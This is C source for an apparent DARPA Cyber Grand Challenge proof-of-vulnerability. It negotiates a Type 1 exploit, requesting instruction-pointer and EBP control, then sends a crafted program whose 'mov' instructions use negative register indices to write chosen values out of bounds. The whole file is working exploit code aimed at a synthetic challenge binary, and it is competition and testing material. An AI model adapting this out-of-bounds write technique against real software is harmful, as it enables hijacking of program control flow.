#include <libcgc.h>

unsigned int ReadBytes(int fd, void *buf, size_t NumBytes) {
	size_t BytesReceived = 0;
	size_t rx_bytes;

	if (buf == NULL) {
		return(0);
	}

	while (BytesReceived < NumBytes) {
		if (receive(fd, buf+BytesReceived, NumBytes-BytesReceived, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		BytesReceived += rx_bytes;
	}

	return(BytesReceived);
}

unsigned int SendString(int fd, char *Str);
unsigned int SendBytes(int fd, void *buf, size_t NumBytes) {
	size_t BytesSent = 0;
	size_t tx_bytes;

	if (buf == NULL) {
		return(0);
	}

	while (BytesSent < NumBytes) {
		if (transmit(fd, buf+BytesSent, NumBytes-BytesSent, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes == 0) {
			return(0);
		}
		BytesSent += tx_bytes;
	}

	return(BytesSent);
}

unsigned int SendString(int fd, char *Str) {
	size_t NumBytes = 0;

	if (Str == NULL) {
		return(0);
	}

	while (Str[NumBytes] != '\0') {
		NumBytes++;
	}

	if (SendBytes(fd, Str, NumBytes) != NumBytes) {
		return(0);
	} else {
		return(1);
	}
}

int NegotiateType1(unsigned int *ipmask, unsigned int *regmask, unsigned int regnum, unsigned int *ipvalue, unsigned int *regvalue) {
	unsigned char Type1[5] = "\x01\x00\x00\x00";

	if (ipmask == NULL || regmask == NULL) {
		return(0);
	}

	// transmit the Type 1 negotiation flag
	if (SendBytes(3, Type1, 4) != 4) {
		return(0);
	}

	// transmit the ipmask
	if (SendBytes(3, ipmask, 4) != 4) {
		return(0);
	}

	// transmit the regmask
	if (SendBytes(3, regmask, 4) != 4) {
		return(0);
	}

	// transmit the regnum
	if (SendBytes(3, &regnum, 4) != 4) {
		return(0);
	}

	// receive the ipvalue
	if (ReadBytes(3, ipvalue, 4) != 4) {
		return(0);
	}

	// receive the regvalue
	if (ReadBytes(3, regvalue, 4) != 4) {
		return(0);
	}

	return(1);
}

void itoa(unsigned int i, char a[11]) {
	unsigned int rem;
	unsigned int len = 0;
	char tmp[11];

	while (i) {
		rem = i % 10;
		i = i / 10;
		tmp[len++] = '0'+rem;
	}

	// reverse the tmp string byte order
	i = 0;
	a[len--] = '\0';
	while (len) {
		a[len--] = tmp[i++];
	}
	a[len] = tmp[i];

}

int main(void) {
	unsigned int ipmask = 0x7fffffff;
	unsigned int regmask = 0x7fffffff;
	unsigned int regnum = 5; // EBP
	unsigned int ipvalue;
	unsigned int regvalue;
	char a[11];

	if (!NegotiateType1(&ipmask, &regmask, regnum, &ipvalue, &regvalue)) {
		return(0);
	}
	ipvalue &= ipmask;
	regvalue &= regmask;

	if (!SendString(1, "aPenFullOfSheep:)\n")) {
		return(0);
	}

	itoa(ipvalue, a);
	if (!SendString(1, "mov r-1073741301,")) {
		return(0);
	}
	if (!SendString(1, a)) {
		return(0);
	}
	if (!SendString(1, "\n")) {
		return(0);
	}

	itoa(regvalue, a);
	if (!SendString(1, "mov r-1073741302,")) {
		return(0);
	}
	if (!SendString(1, a)) {
		return(0);
	}
	if (!SendString(1, "\n")) {
		return(0);
	}

	if (!SendString(1, "END\n")) {
		return(0);
	}

	if (ReadBytes(0, a, 1) != 1) {
		return(0);
	}

	return(0);
}
